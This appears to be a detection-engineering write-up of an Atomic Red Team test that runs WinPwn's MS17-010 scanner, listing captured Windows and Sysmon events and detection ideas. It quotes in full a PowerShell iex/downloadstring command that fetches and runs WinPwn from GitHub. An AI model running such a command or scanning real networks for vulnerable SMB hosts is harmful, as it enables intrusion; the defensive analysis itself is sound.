# T1046-6: Network Service Discovery — WinPwn MS17-10

## Technique Context

T1046 Network Service Discovery includes scanning for specific vulnerabilities across network-accessible systems. WinPwn's `MS17-10` module scans the network for hosts vulnerable to MS17-010, the SMB vulnerability exploited by EternalBlue and used in the WannaCry and NotPetya campaigns. Attackers run this scan to identify Windows systems with unpatched SMBv1 exposed on port 445 before deploying EternalBlue-based payloads or using those systems as lateral movement targets.

WinPwn uses the same delivery mechanism across its modules: a PowerShell `iex` invoking `downloadstring` against a specific GitHub commit of the WinPwn repository, followed by the module function call with non-interactive and console output flags. This consistency makes the framework detectable at the invocation layer regardless of which specific module is used.

MS17-010 remains relevant years after patching became available because legacy systems, IoT devices, and unmanaged endpoints frequently run unpatched SMBv1. Identifying these systems through network scanning precedes exploitation attempts that bypass modern endpoint protections on the scanning host itself.

## What This Dataset Contains

With Defender disabled, WinPwn downloaded and the MS17-10 scanner executed. The telemetry structure closely parallels T1046-5 (spoolvulnscan) but without the Credential Manager read events.

Security EID 4688 captures the full invocation: `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') MS17-10 -noninteractive -consoleoutput}`. The same GitHub commit hash `121dcee26a7aca368821563cbe92b2b5638c5773` appears here as in T1046-5, T1046-7, and T1046-8, documenting that all four WinPwn tests use the same framework version.

Sysmon EID 1 confirms the process creation with parent PowerShell context. Sysmon contains 1 EID 3 network connection event (framework download from GitHub) and 1 EID 22 DNS query event (resolution of `raw.githubusercontent.com`).

The Application channel contains an EID 15 event: `Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON`. This event documents the Windows Security Center re-enabling Defender's registered status during or after the test — consistent with the test environment's Defender disable/enable cycle. This event was not present in the defended dataset where Defender was active throughout.

The PowerShell channel has 107 EID 4104 script block events and 1 EID 4103 module logging event, consistent with a PowerShell session that imported and executed WinPwn modules. The cleanup block `try { Invoke-AtomicTest T1046 -TestNumbers 6 -Cleanup -Confirm:$false 2>&1 | Out-Null } catch {}` is captured in EID 4104.

The undefended dataset (1 Application, 109 PowerShell, 4 Security, 34 Sysmon) differs from the defended version (37 Sysmon, 10 Security, 51 PowerShell) primarily in the appearance of the Application EID 15 event and fewer Security/Sysmon events. The defended version generated more Security events as Defender's blocking action triggered additional process audit events; the undefended run's cleaner execution produced fewer secondary process interactions.

## What This Dataset Does Not Contain

No SMB scanning network events are captured despite the MS17-10 module executing. The WinPwn MS17-10 module performs SMB probing entirely within PowerShell process space using .NET Socket operations rather than spawning child processes, so no EID 1 process creation events appear for scanning activity. The Sysmon EID 3 events captured are for the framework download, not the scan probes — SMB connections to port 445 from the WinPwn scan would be in the full event stream if present but are not among the sampled events.

No EID 5379 Credential Manager read events appear, distinguishing this module from `spoolvulnscan` which performed credential enumeration as part of its operation. MS17-10 scanning focuses on network probing rather than credential access.

The scan results (which hosts are vulnerable to MS17-010) are not logged in any monitored channel.

## Assessment

This dataset provides solid process execution telemetry for the WinPwn download-and-execute pattern, with the Application channel EID 15 event serving as an additional environmental signal. The dataset is structurally very similar to T1046-5, T1046-7, and T1046-8 — the four WinPwn tests use the same framework and delivery mechanism, differing only in the module called. Detection logic that fires on the WinPwn GitHub URL or `iex`+`downloadstring` pattern will cover all four.

The primary value over the defended version is the presence of the framework download network events and the absence of AMSI blocking evidence, showing clean execution telemetry for the IEX pattern.

## Detection Opportunities Present in This Data

1. Security EID 4688 or Sysmon EID 1 where `CommandLine` contains `downloadstring` with `raw.githubusercontent.com` and a WinPwn module function name (`MS17-10`, `spoolvulnscan`, `bluekeep`, `fruit`) — module-specific detection.

2. The WinPwn commit hash `121dcee26a7aca368821563cbe92b2b5638c5773` appearing in any command line or script block event — this exact string identifies the specific WinPwn version used across all four T1046 WinPwn tests.

3. Sysmon EID 3 network connection from `powershell.exe` to GitHub CDN IPs followed within the same session by EID 3 connections to port 445 on internal subnet IPs — the download-then-scan sequence.

4. Sysmon EID 22 DNS query for `raw.githubusercontent.com` from a process context that shows no legitimate software development or package management activity.

5. Application log EID 15 (`Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON`) combined with Security EID 4688 events for PowerShell IEX activity in the same time window — the Defender status change can indicate the end of a test-environment Defender-disable window, correlating with active attack execution.

6. PowerShell EID 4104 script block containing `iex` combined with a full GitHub raw content URL pattern `https://raw.githubusercontent.com/[user]/[repo]/[hash]/[file].ps1` — this pattern is consistent with fileless framework delivery.

7. Burst of outbound Sysmon EID 3 connections from `powershell.exe` to port 445 across multiple destination IPs — SMB scanning from PowerShell process space has no legitimate use case.
